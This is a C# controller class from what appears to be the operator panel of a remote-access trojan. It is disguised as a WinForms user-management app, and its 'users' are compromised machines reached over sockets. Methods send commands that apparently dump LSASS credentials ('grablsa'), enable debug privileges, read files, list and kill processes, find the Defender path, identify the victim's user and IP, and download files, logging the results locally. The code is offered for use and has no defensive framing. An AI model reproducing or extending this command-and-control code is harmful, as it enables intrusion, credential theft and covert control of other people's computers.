using System;
using System.Collections;
using System.Data.Common;
using System.IO;
using System.Net.Sockets;
using System.Reflection;
using System.Text;
using WinFormMVC.Model;
using static System.Net.WebRequestMethods;
using File = System.IO.File;

namespace WinFormMVC.Controller
{
    public class UsersController
    {
        IUsersView _view;
        IList      _users;
        User       _selectedUser;

        public UsersController(IUsersView view, IList users)
        {
            _view = view;
            _users = users;
            view.SetController(this);
        }

        public IList Users
        {
           get { return ArrayList.ReadOnly(_users); }
        }

        private void updateViewDetailValues(User usr)
        {
           _view.Username   =  usr.Username;
           _view.LastName    =  usr.LastName;
           _view.ID          =  usr.ID;
           _view.Defender  =  usr.Department;
            _view.status = usr.status;
            _view.path = usr.path;
            _view.seDBG = usr.seDBG;
            _view.lsPid = usr.lsPid;
        }

        private void updateUserWithViewValues(User usr)
        {
           usr.Username     =  _view.Username;
           usr.LastName      =  _view.LastName;
           usr.ID            =  _view.ID;
           usr.Department    =  _view.Defender;
           usr.status           =  _view.status;
            usr.seDBG= _view.seDBG;
            usr.path = _view.path;
            usr.lsPid = _view.lsPid;
        }


        public void LoadView()
        {
            _view.ClearGrid();
            foreach (User usr in _users)
                _view.AddUserToGrid(usr);

           _view.SetSelectedUserInGrid((User)_users[0]);

        }

        public void SelectedUserChanged(string selectedUserId)
        {
            foreach (User usr in this._users)
            {
                if (usr.ID == selectedUserId)
                {
                    _selectedUser = usr;
                    updateViewDetailValues(usr);
                    _view.SetSelectedUserInGrid(usr);
                    this._view.CanModifyID = false;
                    break;
                }
            }
        }


        public void AddNewUser()
        {
            _selectedUser = new User("unknown",
                                     "unknown" ,
                                     "unknown" ,
                                     "unknown" ,
                                    true , 
                                    null, 
                                    new ArrayList(),
                                    "unknown",
                                    "unknown",
                                    "unknown");

            this.updateViewDetailValues(_selectedUser);
            this._view.CanModifyID = true;
        }


        public void grablsa()
        {
            string id = this._view.GetIdOfSelectedUserInGrid();
            User userToSend = null;

            if (id != "")
            {
                foreach (User usr in this._users)
                {
                    if (usr.ID == id)
                    {
                        userToSend = usr;
                        break;
                    }
                }

                if (userToSend != null)
                {
                    byte[] bytes = Encoding.ASCII.GetBytes($"{{\"command_in\":\"krl\"}}");


                    string data = null;

                    data += consume(bytes, userToSend.Sock);
                    userToSend.Fsinfo.Add(data);

                    string fileName = "./logs.txt";
                    StreamWriter writer;

                    if (!File.Exists(fileName))
                    {
                        writer = new StreamWriter(fileName);
                    }
                    else
                    {
                        writer = File.AppendText(fileName);
                    }
                    _view.Output = data;
                    writer.WriteLine(data);
                    writer.Close();
                    this.Save();

                }
            }
        }


        public string consume(byte[] bytes,Socket Sock)
        {

            Sock.Send(bytes);
            string data = null;
            bytes = new byte[4096];
            int bytesRec = Sock.Receive(bytes);
            data += Encoding.ASCII.GetString(bytes, 0, bytesRec);
            return data;
        }
        public void sedbg()
        {
            string id = this._view.GetIdOfSelectedUserInGrid();
            User userToSend = null;

            if (id != "")
            {
                foreach (User usr in this._users)
                {
                    if (usr.ID == id)
                    {
                        userToSend = usr;
                        break;
                    }
                }

                if (userToSend != null)
                {
                    byte[] bytes = Encoding.ASCII.GetBytes($"{{\"command_in\":\"se\"}}");

                    string data = null;
                    
                    data += consume(bytes, userToSend.Sock);
                    userToSend.Fsinfo.Add(data);
                    string fileName = "./logs.txt";
                    StreamWriter writer;

                    if (!File.Exists(fileName))
                    {
                        writer = new StreamWriter(fileName);
                    }
                    else
                    {
                        writer = File.AppendText(fileName);
                    }
                    _view.seDBG= parseJson(data);
                    writer.WriteLine(data);
                    writer.Close();
                    this.Save();

                }
            }
        }

        public void Dir(string directory)
        {
            string id = this._view.GetIdOfSelectedUserInGrid();
            User userToSend = null;

            if (id != "")
            {
                foreach (User usr in this._users)
                {
                    if (usr.ID == id)
                    {
                        userToSend = usr;
                        break;
                    }
                }

                if (userToSend != null)
                {
                    byte[] bytes = Encoding.ASCII.GetBytes($"{{\"command_in\":\"dir {directory}\"}}");

                    if (directory.Equals(".") || directory.Length == 0)
                    {
                        bytes = Encoding.ASCII.GetBytes($"{{\"command_in\":\"dir ./\"}}");
                    }
                    string data = null;

                    data += consume(bytes, userToSend.Sock);
                    string fileName = "./logs.txt";
                    StreamWriter writer;

                    if (!File.Exists(fileName))
                    {
                        writer = new StreamWriter(fileName);
                    }
                    else
                    {
                        writer = File.AppendText(fileName);
                    }
                    _view.Output = parseJson(data);
                    writer.WriteLine(data);
                    writer.Close();
                    this.Save();

                }
            }
        }



        public bool cat(string directory)
        {
            if (directory.Length == 0)
                return true;
            string id = this._view.GetIdOfSelectedUserInGrid();
            User userToSend = null;

            if (id != "")
            {
                foreach (User usr in this._users)
                {
                    if (usr.ID == id)
                    {
                        userToSend = usr;
                        break;
                    }
                }

                if (userToSend != null)
                {
                    byte[] bytes = Encoding.ASCII.GetBytes($"{{\"command_in\":\"type {directory}\"}}");

                    if (!directory.StartsWith(".") )
                    {
                        bytes = Encoding.ASCII.GetBytes($"{{\"command_in\":\"type ./{directory}\"}}");
                    }
                    userToSend.Sock.Send(bytes);
                    string data = null;

                    data += consume(bytes, userToSend.Sock);
                    string fileName = "./logs.txt";
                    StreamWriter writer;

                    if (!File.Exists(fileName))
                    {
                        writer = new StreamWriter(fileName);
                    }
                    else
                    {
                        writer = File.AppendText(fileName);
                    }
                    _view.Output = parseJson(data);
                    writer.WriteLine(data);
                    writer.Close();
                    this.Save();

                }

            }
            return false;

        }

        public string parseJson(string data)
        {
            
            data = data.Substring(1, data.Length - 2);
            string[] words = data.Split(',');

            foreach (var word in words)
            {
                string[] tuples = word.Split(':');
                if (tuples[0].Equals("\"command_out\""))
                {
                    int index = tuples[1].IndexOf("\\u0000");
                    if (index == -1)
                    {
                            return tuples[1];
             

                    }

                    return tuples[1].Substring(1, index - 1);
                }

            }
            return "";
        }


        public void getUsername()
        {


            string id = this._view.GetIdOfSelectedUserInGrid();
            User userToSend = null;

            if (id != "")
            {
                foreach (User usr in this._users)
                {
                    if (usr.ID == id)
                    {
                        userToSend = usr;
                        break;
                    }
                }

                if (userToSend != null)
                {
                    byte[] bytes = Encoding.ASCII.GetBytes($"{{\"command_in\":\"whoami\"}}");
                    string data = null;

                    data += consume(bytes, userToSend.Sock);

                    data = data.Substring(1, data.Length - 2);
                    _view.Username = parseJson(data);

                    this.Save();

                }
            }
        }

        public void getLocalIp()
        {


            string id = this._view.GetIdOfSelectedUserInGrid();
            User userToSend = null;

            if (id != "")
            {
                foreach (User usr in this._users)
                {
                    if (usr.ID == id)
                    {
                        userToSend = usr;
                        break;
                    }
                }

                if (userToSend != null)
                {
                    byte[] bytes = Encoding.ASCII.GetBytes($"{{\"command_in\":\"ip\"}}");

                    string data = null;

                    data += consume(bytes, userToSend.Sock);
                    data = data.Substring(1, data.Length - 2);
                    string[] words = data.Split(',');

                    foreach (var word in words)
                    {
                        string[] tuples = word.Split(':');
                        if (tuples[0].Equals("\"command_out\""))
                        {

                            _view.LastName = tuples[1];
                        }

                    }
                    this.Save();

                }
            }
        }








        public void getTasks()
        {


            string id = this._view.GetIdOfSelectedUserInGrid();
            User userToSend = null;

            if (id != "")
            {
                foreach (User usr in this._users)
                {
                    if (usr.ID == id)
                    {
                        userToSend = usr;
                        break;
                    }
                }

                if (userToSend != null)
                {
                    byte[] bytes = Encoding.ASCII.GetBytes($"{{\"command_in\":\"tsks\"}}");

                    string data = null;

                    data += consume(bytes, userToSend.Sock); 
                    data = data.Substring(1, data.Length - 2);
                    string[] words = data.Split(',');

                    foreach (var word in words)
                    {
                        string[] tuples = word.Split(':');
                        if (tuples[0].Equals("\"command_out\""))
                        {
                            _view.lsPid = tuples[1].Replace("l", "7").Replace("k", "8").Replace("f", "9") ;
                            _view.Output =  " file written on remote host at results.txt";
                        }

                    }

                    this.Save();

                }
            }
        }



        public void getPath()
        {


            string id = this._view.GetIdOfSelectedUserInGrid();
            User userToSend = null;

            if (id != "")
            {
                foreach (User usr in this._users)
                {
                    if (usr.ID == id)
                    {
                        userToSend = usr;
                        break;
                    }
                }

                if (userToSend != null)
                {
                    byte[] bytes = Encoding.ASCII.GetBytes($"{{\"command_in\":\"wher\"}}");

                    string data = null;

                    data += consume(bytes, userToSend.Sock);

                    data = data.Substring(1, data.Length - 2);
                    string[] words = data.Split(',');

                    foreach (var word in words)
                    {
                        string[] tuples = word.Split(':');
                        if (tuples[0].Equals("\"command_out\""))
                        {

                            _view.path =tuples[1]+":"+tuples[2];
                        }

                    }

                    this.Save();

                }
            }
        }


        public void searchName(string name)
        {


            string id = this._view.GetIdOfSelectedUserInGrid();
            User userToSend = null;

            if (id != "")
            {
                foreach (User usr in this._users)
                {
                    if (usr.ID == id)
                    {
                        userToSend = usr;
                        break;
                    }
                }

                if (userToSend != null)
                {
                    byte[] bytes = Encoding.ASCII.GetBytes($"{{\"command_in\":\"sn {name}\"}}");

                    string data = null;

                    data += consume(bytes, userToSend.Sock);

                    string[] words = data.Split(',');

                    foreach (var word in words)
                    {
                        string[] tuples = word.Split(':');
                        if (tuples[0].Equals("\"command_out\""))
                        {

                            _view.Output = tuples[1];
                        }

                    }

                    this.Save();

                }
            }
        }

        public void searchWD()
        {


            string id = this._view.GetIdOfSelectedUserInGrid();
            User userToSend = null;

            if (id != "")
            {
                foreach (User usr in this._users)
                {
                    if (usr.ID == id)
                    {
                        userToSend = usr;
                        break;
                    }
                }

                if (userToSend != null)
                {
                    byte[] bytes = Encoding.ASCII.GetBytes($"{{\"command_in\":\"wd\"}}");
                    string data = null;

                    data += consume(bytes, userToSend.Sock);
                    string[] words = data.Split(',');

                    foreach (var word in words)
                    {
                        string[] tuples = word.Split(':');
                        if (tuples[0].Equals("\"command_out\""))
                        {

                            _view.Defender = tuples[1];
                        }

                    }

                    this.Save();

                }
            }
        }


        public void download(string path)
        {


            string id = this._view.GetIdOfSelectedUserInGrid();
            User userToSend = null;

            if (id != "")
            {
                foreach (User usr in this._users)
                {
                    if (usr.ID == id)
                    {
                        userToSend = usr;
                        break;
                    }
                }

                if (userToSend != null)
                {
                    byte[] bytes = Encoding.ASCII.GetBytes($"{{\"command_in\":\"dl {path}\"}}");

                    userToSend.Sock.Send(bytes);
                    string data = null;


                    bytes = new byte[4096];
                    int bytesRec = userToSend.Sock.Receive(bytes);

                    _view.Output = data;

                    this.Save();

                }
            }
        }

        public void killName(string name)
        {


            string id = this._view.GetIdOfSelectedUserInGrid();
            User userToSend = null;

            if (id != "")
            {
                foreach (User usr in this._users)
                {
                    if (usr.ID == id)
                    {
                        userToSend = usr;
                        break;
                    }
                }

                if (userToSend != null)
                {
                    byte[] bytes = Encoding.ASCII.GetBytes($"{{\"command_in\":\"kn {name}\"}}");
                    string data = null;

                    data += consume(bytes, userToSend.Sock);
                    _view.Output = data;

                    this.Save();

                }
            }
        }






        public void RemoveUser()
        {
            string id = this._view.GetIdOfSelectedUserInGrid();
            User userToRemove = null;

            if (id != "")
            {
                foreach (User usr in this._users)
                {
                    if (usr.ID == id)
                    {
                        userToRemove = usr;
                        break;
                    }
                }

                if (userToRemove != null)
                {
                    int newSelectedIndex = this._users.IndexOf(userToRemove);
                    this._users.Remove(userToRemove);
                    this._view.RemoveUserFromGrid(userToRemove);

                    if (newSelectedIndex > -1 && newSelectedIndex < _users.Count)
                    {
                        this._view.SetSelectedUserInGrid((User)_users[newSelectedIndex]);
                    }
                }
            }
        }

        public void Save()
        {
            updateUserWithViewValues(_selectedUser);
            if (!this._users.Contains(_selectedUser))
            {
                // Add new user
                this._users.Add(_selectedUser);
                this._view.AddUserToGrid(_selectedUser);
            }
            else
            {
                // Update existing
                this._view.UpdateGridWithChangedUser(_selectedUser);
            }
            _view.SetSelectedUserInGrid(_selectedUser);
            this._view.CanModifyID = false;

        }

    }
}
